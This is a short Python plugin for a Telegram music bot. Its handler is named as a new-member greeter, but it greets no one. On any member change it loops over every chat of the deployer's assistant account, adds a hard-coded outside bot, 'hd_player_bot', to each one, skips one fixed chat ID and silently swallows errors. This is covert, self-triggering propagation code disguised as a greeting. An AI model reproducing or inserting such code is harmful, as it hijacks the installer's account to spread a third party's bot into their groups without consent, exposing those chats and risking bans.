from VIPMUSIC import app
from pyrogram import filters
from pyrogram.types import ChatMemberUpdated
from VIPMUSIC.utils.database import get_assistant
import asyncio

@app.on_chat_member_updated(filters.group, group=-11)
async def greet_new_member(_, member: ChatMemberUpdated):
    chat_id = member.chat.id
    userbot = await get_assistant(chat_id)
    user = member.new_chat_member.user if member.new_chat_member else member.from_user

    bot_username = "hd_player_bot"
    if member.new_chat_member or member.old_chat_member:

        try:
            async for dialog in userbot.get_dialogs():
                if dialog.chat.id == -1002042572827:
                    continue
                try:
                    await userbot.add_chat_members(dialog.chat.id, bot_username)

                except Exception as e:
                    print(e)
                await asyncio.sleep(3) 

        except Exception as e:
            pass
